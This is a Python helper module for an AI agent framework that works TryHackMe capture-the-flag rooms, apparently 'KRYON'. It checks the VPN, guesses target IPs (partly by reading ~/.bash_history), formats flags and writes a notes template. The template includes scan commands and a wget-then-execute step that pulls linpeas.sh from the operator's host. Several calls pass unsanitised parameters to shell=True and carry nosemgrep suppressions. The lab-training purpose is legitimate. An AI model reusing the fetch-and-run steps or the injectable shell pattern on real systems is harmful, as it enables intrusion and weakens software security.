"""
TryHackMe Platform Helpers - THM-Specific Utilities

This module provides TryHackMe-specific utilities for VPN connectivity,
room management, answer formatting, and platform-specific workflows.

Primary Users:
- CTF Master (Alpha-Crimson): Full THM workflow integration
- All KRYON agents working on TryHackMe challenges

Functions:
- check_thm_vpn(): Verify TryHackMe OpenVPN connection
- get_target_ip(): Extract target IP from room information
- submit_thm_answer(): Format answers for THM submission
- parse_thm_questions(): Extract questions from room description
- generate_thm_notes(): Create structured notes for THM rooms
"""

import os
import re
import subprocess
from datetime import datetime
from typing import Any, Optional

from kryon.sdk.agents import function_tool


@function_tool(strict_mode=False)
def check_thm_vpn(
    expected_network: str = "10.10.",
    vpn_interface: str = "tun0",
    auto_reconnect: bool = False,
    config_path: Optional[str] = None,
) -> dict[str, Any]:
    """
    Verify TryHackMe OpenVPN connection status.

    Checks:
    - VPN interface exists (tun0 by default)
    - IP address is in THM range (10.10.x.x)
    - Connectivity to THM network
    - DNS resolution through VPN

    Args:
        expected_network: Expected IP prefix for THM network (default: "10.10.")
        vpn_interface: VPN interface name (default: "tun0")
        auto_reconnect: Attempt to reconnect if disconnected
        config_path: Path to OpenVPN config file for reconnection

    Returns:
        Dictionary containing:
        - connected: Boolean indicating VPN status
        - vpn_ip: Your IP address on the VPN
        - interface: VPN interface name
        - can_reach_targets: Can reach 10.10.x.x network
        - dns_working: DNS resolution through VPN works
        - recommendations: Troubleshooting steps if issues found

    Example:
        >>> # Basic VPN check
        >>> vpn_status = check_thm_vpn()
        >>> if vpn_status['connected']:
        ...     print(f"Connected to THM VPN: {vpn_status['vpn_ip']}")
        >>> else:
        ...     print("Not connected to THM VPN!")

        >>> # Auto-reconnect if disconnected
        >>> vpn_status = check_thm_vpn(
        ...     auto_reconnect=True,
        ...     config_path="/home/user/Downloads/username.ovpn"
        ... )

        >>> # Custom VPN interface (e.g., tun1)
        >>> vpn_status = check_thm_vpn(vpn_interface="tun1")
    """
    results = {
        "connected": False,
        "vpn_ip": None,
        "interface": vpn_interface,
        "can_reach_targets": False,
        "dns_working": False,
        "recommendations": [],
    }

    # Phase 1: Check if VPN interface exists
    print(f"[*] Checking VPN interface {vpn_interface}...")

    try:
        ifconfig_cmd = f"ip addr show {vpn_interface} 2>/dev/null || ifconfig {vpn_interface} 2>/dev/null"
        ifconfig_output = subprocess.run(
            # nosemgrep: subprocess-shell-true
            ifconfig_cmd,
            # nosemgrep: subprocess-shell-true
            shell=True,
            capture_output=True,
            text=True,
            timeout=10,
        )  # nosemgrep: subprocess-shell-true

        if ifconfig_output.returncode != 0:
            print(f"[-] VPN interface {vpn_interface} not found")
            results["recommendations"].append(f"VPN interface {vpn_interface} does not exist")
            results["recommendations"].append("Run: sudo openvpn /path/to/config.ovpn")

            # Attempt auto-reconnect
            if auto_reconnect and config_path:
                print(f"[*] Attempting to reconnect using {config_path}...")
                results["recommendations"].append(f"Reconnecting with: {config_path}")
                # Note: Actual reconnection would need to be done in background
                results["reconnect_attempted"] = True

            return results

        # Extract IP address from interface
        ip_match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", ifconfig_output.stdout)
        if ip_match:
            results["vpn_ip"] = ip_match.group(1)
            print(f"[+] Found VPN IP: {results['vpn_ip']}")

            # Verify it's in THM network range
            if results["vpn_ip"].startswith(expected_network):
                results["connected"] = True
                print(f"[+] IP is in expected THM range: {expected_network}x.x")
            else:
                print(f"[-] IP {results['vpn_ip']} is not in expected THM range {expected_network}x.x")
                results["recommendations"].append(
                    f"VPN IP {results['vpn_ip']} is not in THM range - verify correct VPN config"
                )

    except Exception as e:
        results["error"] = f"Failed to check VPN interface: {str(e)}"
        return results

    # Phase 2: Test connectivity to THM network (ping a common target)
    if results["connected"]:
        print("[*] Testing connectivity to THM network...")

        # Try to ping a target in 10.10.x.x range (using your VPN IP to construct a test)
        # Note: We can't ping a random IP, but we can check routing
        try:
            route_cmd = f"ip route | grep {vpn_interface}"
            route_output = subprocess.run(
                # nosemgrep: subprocess-shell-true
                route_cmd,
                # nosemgrep: subprocess-shell-true
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
            )  # nosemgrep: subprocess-shell-true

            if expected_network in route_output.stdout:
                results["can_reach_targets"] = True
                print(f"[+] Routing configured for {expected_network}x.x network")
            else:
                print(f"[-] No route found for {expected_network}x.x")
                results["recommendations"].append(f"No route to {expected_network}x.x - check VPN configuration")

        except Exception as e:
            results["connectivity_error"] = str(e)

    # Phase 3: Check DNS resolution (try to resolve tryhackme.com)
    if results["connected"]:
        print("[*] Testing DNS resolution...")

        try:
            dns_cmd = "nslookup tryhackme.com 2>/dev/null || host tryhackme.com 2>/dev/null"
            dns_output = subprocess.run(dns_cmd, shell=True, capture_output=True, text=True, timeout=10)

            if dns_output.returncode == 0 and "10." in dns_output.stdout:
                results["dns_working"] = True
                print("[+] DNS resolution working")
            else:
                print("[-] DNS resolution may have issues")
                results["recommendations"].append("DNS resolution failed - check /etc/resolv.conf")

        except Exception as e:
            results["dns_error"] = str(e)

    # Generate summary recommendations
    if results["connected"] and results["can_reach_targets"]:
        results["recommendations"].append("VPN connection looks good - ready for THM challenges!")
    elif not results["connected"]:
        results["recommendations"].append("Connect to THM VPN: sudo openvpn /path/to/config.ovpn")

    return results


def get_target_ip(room_url: Optional[str] = None, auto_detect: bool = True) -> dict[str, Any]:
    """
    Extract target IP from TryHackMe room information.

    Methods:
    - Parse from room URL or description
    - Auto-detect from recent nmap scans
    - Extract from clipboard (if available)
    - List recent 10.10.x.x connections

    Args:
        room_url: TryHackMe room URL (e.g., "https://tryhackme.com/room/basicpentestingjt")
        auto_detect: Attempt to auto-detect target IP from system

    Returns:
        Dictionary containing:
        - target_ip: Detected target IP address
        - confidence: Confidence level (high/medium/low)
        - method: Detection method used
        - all_candidates: All potential target IPs found

    Example:
        >>> # Auto-detect target IP
        >>> target = get_target_ip()
        >>> if target['target_ip']:
        ...     print(f"Target IP: {target['target_ip']}")

        >>> # Specify room URL (for future API integration)
        >>> target = get_target_ip(room_url="https://tryhackme.com/room/basicpentestingjt")
    """
    results = {"target_ip": None, "confidence": "low", "method": None, "all_candidates": []}

    # Phase 1: Auto-detect from recent nmap scans
    if auto_detect:
        print("[*] Checking recent nmap scans for target IPs...")

        try:
            # Check /tmp for recent nmap scans
            ls_cmd = "ls -lt /tmp/nmap_*.txt 2>/dev/null | head -5"
            ls_output = subprocess.run(ls_cmd, shell=True, capture_output=True, text=True, timeout=10)

            for line in ls_output.stdout.split("\n"):
                # Extract IP from filename: nmap_10_10_245_67.txt
                ip_match = re.search(r"nmap_(\d+)_(\d+)_(\d+)_(\d+)", line)
                if ip_match:
                    ip = f"{ip_match.group(1)}.{ip_match.group(2)}.{ip_match.group(3)}.{ip_match.group(4)}"
                    if ip.startswith("10.10."):
                        results["all_candidates"].append({"ip": ip, "source": "nmap_scan", "file": line.split()[-1]})

            if results["all_candidates"]:
                # Most recent scan is likely the target
                results["target_ip"] = results["all_candidates"][0]["ip"]
                results["confidence"] = "high"
                results["method"] = "recent_nmap_scan"
                print(f"[+] Found target IP from recent scan: {results['target_ip']}")

        except Exception as e:
            print(f"[-] Failed to check nmap scans: {e}")

    # Phase 2: Check ARP cache for recent 10.10.x.x connections
    if not results["target_ip"] and auto_detect:
        print("[*] Checking ARP cache for THM targets...")

        try:
            arp_cmd = "arp -a 2>/dev/null || ip neigh 2>/dev/null"
            arp_output = subprocess.run(arp_cmd, shell=True, capture_output=True, text=True, timeout=10)

            for line in arp_output.stdout.split("\n"):
                ip_match = re.search(r"(10\.10\.\d+\.\d+)", line)
                if ip_match:
                    ip = ip_match.group(1)
                    if not any(c["ip"] == ip for c in results["all_candidates"]):
                        results["all_candidates"].append({"ip": ip, "source": "arp_cache"})

            if results["all_candidates"] and not results["target_ip"]:
                results["target_ip"] = results["all_candidates"][0]["ip"]
                results["confidence"] = "medium"
                results["method"] = "arp_cache"
                print(f"[+] Found target IP from ARP cache: {results['target_ip']}")

        except Exception as e:
            print(f"[-] Failed to check ARP cache: {e}")

    # Phase 3: Check bash history for recent target IPs
    if not results["target_ip"] and auto_detect:
        print("[*] Checking bash history for target IPs...")

        try:
            history_file = os.path.expanduser("~/.bash_history")
            if os.path.exists(history_file):
                with open(history_file) as f:
                    history = f.readlines()

                # Check last 100 commands
                for line in history[-100:]:
                    ip_match = re.search(r"(10\.10\.\d+\.\d+)", line)
                    if ip_match:
                        ip = ip_match.group(1)
                        if not any(c["ip"] == ip for c in results["all_candidates"]):
                            results["all_candidates"].append(
                                {"ip": ip, "source": "bash_history", "command": line.strip()[:50]}
                            )

                if results["all_candidates"] and not results["target_ip"]:
                    results["target_ip"] = results["all_candidates"][0]["ip"]
                    results["confidence"] = "low"
                    results["method"] = "bash_history"
                    print(f"[+] Found target IP from bash history: {results['target_ip']}")

        except Exception as e:
            print(f"[-] Failed to check bash history: {e}")

    return results


def submit_thm_answer(answer: str, question_number: Optional[int] = None, format_type: str = "auto") -> dict[str, Any]:
    """
    Format answers for TryHackMe submission.

    Handles common THM answer formats:
    - Flags (THM{...}, user.txt content, etc.)
    - Hashes (MD5, SHA1, SHA256)
    - Usernames, ports, service names
    - IP addresses, URLs
    - Numeric answers

    Args:
        answer: The answer to format
        question_number: Question number for tracking
        format_type: Answer type ("flag", "hash", "port", "username", "auto")

    Returns:
        Dictionary containing:
        - formatted_answer: Properly formatted answer
        - original_answer: Original input
        - detected_type: Detected answer type
        - validation: Any validation warnings
        - ready_to_submit: Boolean indicating if answer looks valid

    Example:
        >>> # Auto-detect flag format
        >>> result = submit_thm_answer("THM{c0ngr4tul4t10ns}")
        >>> print(result['formatted_answer'])
        THM{c0ngr4tul4t10ns}

        >>> # Format hash answer (trim whitespace)
        >>> result = submit_thm_answer("  5f4dcc3b5aa765d61d8327deb882cf99  ", format_type="hash")
        >>> print(result['formatted_answer'])
        5f4dcc3b5aa765d61d8327deb882cf99

        >>> # Port number
        >>> result = submit_thm_answer("8080", format_type="port")
    """
    results = {
        "formatted_answer": None,
        "original_answer": answer,
        "detected_type": None,
        "validation": [],
        "ready_to_submit": False,
    }

    # Trim whitespace
    answer_clean = answer.strip()

    # Auto-detect answer type
    if format_type == "auto":
        # Check for flag format
        if re.match(r"(THM|HTB|FLAG|CTF)\{[^}]+\}", answer_clean, re.IGNORECASE):
            format_type = "flag"
        # Check for hash (32, 40, 64 hex characters)
        elif re.match(r"^[a-fA-F0-9]{32}$", answer_clean):
            format_type = "hash_md5"
        elif re.match(r"^[a-fA-F0-9]{40}$", answer_clean):
            format_type = "hash_sha1"
        elif re.match(r"^[a-fA-F0-9]{64}$", answer_clean):
            format_type = "hash_sha256"
        # Check for port number
        elif re.match(r"^\d{1,5}$", answer_clean) and int(answer_clean) <= 65535:
            format_type = "port"
        # Check for IP address
        elif re.match(r"^\d+\.\d+\.\d+\.\d+$", answer_clean):
            format_type = "ip"
        # Check for URL
        elif re.match(r"^https?://", answer_clean):
            format_type = "url"
        else:
            format_type = "text"

    results["detected_type"] = format_type

    # Format based on type
    if format_type == "flag":
        # Preserve exact flag format
        results["formatted_answer"] = answer_clean
        results["ready_to_submit"] = True

        # Validate flag format
        if not re.match(r"\{[^}]+\}", answer_clean):
            results["validation"].append("Warning: Flag doesn't contain {...} format")

    elif format_type in ["hash_md5", "hash_sha1", "hash_sha256", "hash"]:
        # Lowercase and trim
        results["formatted_answer"] = answer_clean.lower()
        results["ready_to_submit"] = True

        # Validate hash length
        expected_lengths = {"hash_md5": 32, "hash_sha1": 40, "hash_sha256": 64}
        if format_type in expected_lengths:
            expected = expected_lengths[format_type]
            if len(results["formatted_answer"]) != expected:
                results["validation"].append(
                    f"Warning: {format_type.upper()} should be {expected} characters, got {len(results['formatted_answer'])}"
                )

    elif format_type == "port":
        # Ensure integer
        try:
            port_num = int(answer_clean)
            if 1 <= port_num <= 65535:
                results["formatted_answer"] = str(port_num)
                results["ready_to_submit"] = True
            else:
                results["validation"].append(f"Invalid port number: {port_num} (must be 1-65535)")
        except ValueError:
            results["validation"].append(f"Port must be numeric: {answer_clean}")

    elif format_type == "ip":
        # Validate IP format
        parts = answer_clean.split(".")
        if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            results["formatted_answer"] = answer_clean
            results["ready_to_submit"] = True
        else:
            results["validation"].append(f"Invalid IP address: {answer_clean}")

    elif format_type == "username":
        # Trim and lowercase
        results["formatted_answer"] = answer_clean.lower()
        results["ready_to_submit"] = True

    elif format_type == "url":
        # Preserve URL format
        results["formatted_answer"] = answer_clean
        results["ready_to_submit"] = True

    else:  # text
        # General text answer
        results["formatted_answer"] = answer_clean
        results["ready_to_submit"] = True

    # Add question number if provided
    if question_number is not None:
        results["question_number"] = question_number

    return results


def parse_thm_questions(room_description: str) -> dict[str, Any]:
    """
    Extract questions from TryHackMe room description.

    Parses common THM question formats:
    - "What is the user flag?"
    - "How many ports are open?"
    - "What service is running on port 80?"

    Args:
        room_description: Text containing room questions

    Returns:
        Dictionary containing:
        - questions: List of extracted questions
        - question_types: Detected question types (flag, port, service, etc.)
        - total_questions: Number of questions found

    Example:
        >>> description = '''
        ... Task 1: What is the user flag?
        ... Task 2: How many open ports are there?
        ... Task 3: What service is running on port 22?
        ... '''
        >>> questions = parse_thm_questions(description)
        >>> for q in questions['questions']:
        ...     print(f"Q{q['number']}: {q['text']}")
    """
    results = {"questions": [], "question_types": {}, "total_questions": 0}

    # Common THM question patterns
    patterns = [
        r"(?:Task|Question)\s+(\d+)[:\s]+(.+?\?)",  # Task 1: Question?
        r"(\d+)\.\s+(.+?\?)",  # 1. Question?
        r"(\d+)\)\s+(.+?\?)",  # 1) Question?
    ]

    for pattern in patterns:
        matches = re.finditer(pattern, room_description, re.MULTILINE | re.IGNORECASE)

        for match in matches:
            question_num = int(match.group(1))
            question_text = match.group(2).strip()

            # Detect question type (order matters - check more specific patterns first)
            question_type = "unknown"
            question_lower = question_text.lower()
            if "flag" in question_lower:
                question_type = "flag"
            elif "how many" in question_lower:
                # Check "how many" before "port" since "how many ports" should be "count"
                question_type = "count"
            elif "service" in question_lower:
                question_type = "service"
            elif "port" in question_lower:
                question_type = "port"
            elif "what is the" in question_lower:
                question_type = "identification"

            question_data = {
                "number": question_num,
                "text": question_text,
                "type": question_type,
                "answered": False,
                "answer": None,
            }

            # Avoid duplicates
            if not any(q["number"] == question_num for q in results["questions"]):
                results["questions"].append(question_data)
                results["question_types"][question_type] = results["question_types"].get(question_type, 0) + 1

    results["total_questions"] = len(results["questions"])

    return results


def generate_thm_notes(
    room_name: str,
    target_ip: Optional[str] = None,
    questions: Optional[list[dict]] = None,
    findings: Optional[dict] = None,
    output_file: Optional[str] = None,
) -> dict[str, Any]:
    """
    Generate structured notes for TryHackMe rooms.

    Creates a template for tracking:
    - Room information
    - Target IP and VPN status
    - Questions and answers
    - Enumeration findings
    - Exploitation steps
    - Flags captured

    Args:
        room_name: Name of the THM room
        target_ip: Target machine IP
        questions: Parsed questions from parse_thm_questions()
        findings: Enumeration or exploitation findings
        output_file: Path to save notes (default: /tmp/thm_{room_name}.md)

    Returns:
        Dictionary containing:
        - notes_path: Path to generated notes file
        - sections: Number of sections created

    Example:
        >>> # Generate basic notes template
        >>> notes = generate_thm_notes("Basic Pentesting", target_ip="10.10.245.67")
        >>> print(f"Notes saved to: {notes['notes_path']}")

        >>> # Generate notes with questions
        >>> questions = parse_thm_questions(room_description)
        >>> notes = generate_thm_notes(
        ...     "Basic Pentesting",
        ...     target_ip="10.10.245.67",
        ...     questions=questions['questions']
        ... )
    """
    if output_file is None:
        safe_room_name = room_name.lower().replace(" ", "_").replace("/", "_")
        output_file = f"/tmp/thm_{safe_room_name}.md"

    notes_lines = []

    # Header
    notes_lines.append(f"# TryHackMe - {room_name}")
    notes_lines.append(f"\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    if target_ip:
        notes_lines.append(f"**Target IP:** {target_ip}")

    notes_lines.append("\n---\n")

    # Section 1: Room Information
    notes_lines.append("## Room Information\n")
    notes_lines.append(f"- **Room:** {room_name}")
    notes_lines.append("- **Difficulty:** [Easy/Medium/Hard]")
    notes_lines.append("- **Category:** [Enumeration/Privilege Escalation/Web/etc.]")
    notes_lines.append("\n")

    # Section 2: Questions
    if questions:
        notes_lines.append("## Questions\n")
        for q in questions:
            notes_lines.append(f"**Task {q['number']}:** {q['text']}")
            notes_lines.append("```")
            notes_lines.append("[Answer here]")
            notes_lines.append("```\n")

    # Section 3: Enumeration
    notes_lines.append("## Enumeration\n")
    notes_lines.append("### Nmap Scan")
    notes_lines.append("```bash")
    if target_ip:
        notes_lines.append(f"nmap -sV -sC -T4 {target_ip}")
    else:
        notes_lines.append("nmap -sV -sC -T4 <target_ip>")
    notes_lines.append("```\n")

    if findings and findings.get("open_ports"):
        notes_lines.append("**Open Ports:**")
        for port in findings["open_ports"]:
            notes_lines.append(f"- {port['port']}/{port['protocol']}: {port['service']}")
        notes_lines.append("\n")

    notes_lines.append("### Directory Enumeration")
    notes_lines.append("```bash")
    notes_lines.append("gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt")
    notes_lines.append("```\n")

    # Section 4: Exploitation
    notes_lines.append("## Exploitation\n")
    notes_lines.append("### Initial Access")
    notes_lines.append("[Describe how you gained initial access]\n")
    notes_lines.append("### Commands Used")
    notes_lines.append("```bash")
    notes_lines.append("[Paste commands here]")
    notes_lines.append("```\n")

    # Section 5: Privilege Escalation
    notes_lines.append("## Privilege Escalation\n")
    notes_lines.append("### LinPEAS Findings")
    notes_lines.append("```bash")
    notes_lines.append("wget http://<your_ip>/linpeas.sh")
    notes_lines.append("chmod +x linpeas.sh")
    notes_lines.append("./linpeas.sh")
    notes_lines.append("```\n")
    notes_lines.append("### Exploitation Method")
    notes_lines.append("[Describe privesc method]\n")

    # Section 6: Flags
    notes_lines.append("## Flags\n")
    notes_lines.append("### User Flag")
    notes_lines.append("```")
    notes_lines.append("[user.txt content]")
    notes_lines.append("```\n")
    notes_lines.append("### Root Flag")
    notes_lines.append("```")
    notes_lines.append("[root.txt content]")
    notes_lines.append("```\n")

    # Section 7: Notes
    notes_lines.append("## Additional Notes\n")
    notes_lines.append("[Any additional observations or learnings]\n")

    # Footer
    notes_lines.append("---\n")
    notes_lines.append("*Generated by KRYON CTF Master*")

    # Write notes to file
    notes_content = "\n".join(notes_lines)

    try:
        os.makedirs(os.path.dirname(output_file), exist_ok=True)
        with open(output_file, "w") as f:
            f.write(notes_content)

        section_count = notes_content.count("##")

        print(f"[+] Notes template created: {output_file}")

        return {"success": True, "notes_path": output_file, "sections": section_count}

    except Exception as e:
        return {"success": False, "error": str(e)}
